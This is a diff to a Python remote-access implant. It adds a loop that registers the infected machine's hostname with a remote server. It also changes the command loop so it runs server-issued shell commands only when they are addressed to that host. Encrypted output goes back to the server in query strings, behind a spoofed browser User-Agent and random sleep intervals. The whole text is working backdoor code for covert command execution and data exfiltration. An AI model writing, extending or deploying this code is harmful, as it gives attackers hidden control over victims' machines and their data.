@@ -50,6 +50,7 @@ import hashlib
 from Crypto import Random
 from Crypto.Cipher import AES
 import sys
+import platform
 
 # AES Support for Python2/3 - http://depado.markdownblog.com/2015-05-11-aes-cipher-with-python-3-x
 class AESCipher(object):
@@ -96,6 +97,34 @@ cipher = AESCipher(key=CIPHER)
 def random_interval(time_interval1, time_interval2):
     return random.randint(time_interval1, time_interval2)
 
+hostname = platform.node()
+
+# we need to registery our asset first
+while 1:
+    time.sleep(1)
+    try:
+        hostname_send  = cipher.encrypt("magic_hostname=" + hostname).encode('utf-8')
+        hostname_send = base64.b64encode(hostname_send).decode('utf-8')
+
+        # pipe out stdout and base64 encode it then request via a query string parameter
+        if py == "3":
+            req = urllib.request.Request(SITE_URL + SITE_PATH_QUERY + "?" + QUERY_STRING + hostname_send, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'})
+            html = urllib.request.urlopen(req).read()
+            break
+
+        else:
+            req = urllib.Request(SITE_URL + SITE_PATH_QUERY + "?" + QUERY_STRING + hostname_send, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'})
+            html = urllib.urlopen(req).read()
+            break
+
+    # handle exceptions and pass if the server is unavailable, but keep going
+    except Exception as error:
+        # if we can't communicate, just pass
+        if "Connection refused" in str(error):
+            pass
+        else:
+            print("[!] Something went wrong, printing error: " + str(error))
+
 # main call back here
 while 1:
     try:
@@ -113,23 +142,25 @@ while 1:
         parse = cipher.decrypt(parse)
         if parse == "nothing": pass
         else:
-            # execute our parsed command
-            proc = subprocess.Popen(parse, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            stdout_value = proc.communicate()[0]
-            stdout_value = cipher.encrypt(stdout_value).encode('utf-8')
-            stdout_value = base64.b64encode(stdout_value).decode('utf-8')
+            if hostname in parse:
+                parse = parse.split(hostname + "::::")[1]
+                # execute our parsed command
+                proc = subprocess.Popen(parse, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                stdout_value = proc.communicate()[0]
+                stdout_value = cipher.encrypt(hostname + "::::" + stdout_value).encode('utf-8')
+                stdout_value = base64.b64encode(stdout_value).decode('utf-8')
 
-            # pipe out stdout and base64 encode it then request via a query string parameter
-            if py == "3":
-                req = urllib.request.Request(SITE_URL + SITE_PATH_QUERY + "?" + QUERY_STRING + stdout_value, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'})
-                html = urllib.request.urlopen(req).read()
+                # pipe out stdout and base64 encode it then request via a query string parameter
+                if py == "3":
+                    req = urllib.request.Request(SITE_URL + SITE_PATH_QUERY + "?" + QUERY_STRING + stdout_value, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'})
+                    html = urllib.request.urlopen(req).read()
 
-            else:
-                req = urllib.Request(SITE_URL + SITE_PATH_QUERY + "?" + QUERY_STRING + stdout_value, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'})
-                html = urllib.urlopen(req).read()
+                else:
+                    req = urllib.Request(SITE_URL + SITE_PATH_QUERY + "?" + QUERY_STRING + stdout_value, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'})
+                    html = urllib.urlopen(req).read()
 
-            # sleep random interval and let cleanup on server side
-            time.sleep(random_interval(time_interval1, time_interval2))
+                # sleep random interval and let cleanup on server side
+                time.sleep(random_interval(time_interval1, time_interval2))
 
     # handle exceptions and pass if the server is unavailable, but keep going
     except Exception as error:
